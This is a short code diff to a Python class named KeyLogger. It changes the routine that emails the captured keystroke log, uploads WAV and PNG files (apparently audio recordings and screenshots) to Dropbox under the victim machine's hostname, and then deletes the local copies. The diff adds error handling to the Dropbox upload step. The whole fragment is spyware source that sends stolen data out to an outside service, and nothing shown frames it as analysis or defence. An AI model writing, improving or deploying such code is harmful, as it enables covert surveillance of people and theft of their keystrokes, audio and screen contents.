@@ -120,11 +120,15 @@ class KeyLogger:
         self.send_mail(f"{self.log}")
         wav_and_png_files = get_wav_and_png_files(self.dest_folder)
 
-        dbx = dropbox.Dropbox(self.dropbox_token)
-        session = dbx._session
-        session.mount("https://", SSLAdapter())
+        try:
+            dbx = dropbox.Dropbox(self.dropbox_token)
+            session = dbx._session
+            session.mount("https://", SSLAdapter())
+        except (dropbox.exceptions.ApiError, FileNotFoundError, Exception) as e:
+            print(f"Error: {e}")
+            return
 
-        upload_to_dropbox(socket.gethostname(), dbx, wav_and_png_files)
+        upload_to_dropbox(socket.gethostname(), dbx, wav_and_png_files, self.dest_folder)
 
         delete_wav_and_png_files(self.dest_folder)
 
